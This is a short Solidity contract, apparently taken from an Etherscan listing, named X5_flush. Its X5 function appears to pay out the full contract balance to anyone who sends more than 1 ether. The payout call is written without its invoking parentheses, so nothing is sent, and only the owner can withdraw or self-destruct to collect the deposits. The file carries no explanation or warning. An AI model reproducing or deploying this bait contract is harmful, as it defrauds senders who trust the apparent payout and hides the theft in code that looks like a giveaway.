/**

 *Submitted for verification at Etherscan.io on 2019-02-08

*/



pragma solidity ^0.5.3;



contract X5_flush {

    address payable public owner;



    function() external payable {}



    constructor() payable public {

        owner = msg.sender;

    }



    function X5() public payable {

        if(msg.value > 1 ether) {

            msg.sender.call.value(address(this).balance);

        }

    }



    function kill() public payable {

        require(msg.sender == owner);

        selfdestruct(msg.sender);

    }



    function withdraw() public payable {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }



    function withdraw(uint256 amount) public payable {

        require(msg.sender == owner);

        owner.transfer(amount);

    }

}